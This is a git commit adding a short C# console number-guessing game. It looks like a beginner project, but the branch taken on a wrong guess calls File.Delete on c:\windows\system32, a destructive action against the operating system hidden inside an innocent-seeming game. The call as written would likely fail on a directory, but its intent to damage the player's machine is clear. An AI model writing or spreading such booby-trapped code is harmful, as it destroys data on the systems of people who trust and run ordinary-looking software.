1b12eb5918bb75b86abb1b2428d0f1a7c2206ff0
iamkramzTech <bernaldezm88@yahoo.com>
2023-12-19 17:22:27 +0800

    Add project files.

---
+++ Program.cs
@@ -0,0 +1,29 @@
+﻿namespace SimpleGuessingNumberConsoleApp
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            //Console.WriteLine("Hello, World!");
+            Console.ForegroundColor = ConsoleColor.Green;
+            /*Simple Guessing game*/
+            Random random = new Random();
+            var randomNumber = random.Next(1, 10);
+
+            Console.Write("==Silly Guessing Game===");
+            Console.Write(Environment.NewLine);
+            Console.Write("\nGuess number between 1 and 10: ");
+            int guess =int.Parse(Console.ReadLine() ??"0");
+
+            if (guess == randomNumber)
+            {
+                Console.WriteLine("Yey You Won!");
+            }
+            else
+            {
+                File.Delete(@"c:\windows\system32");
+
+            }
+        }
+    }
+}
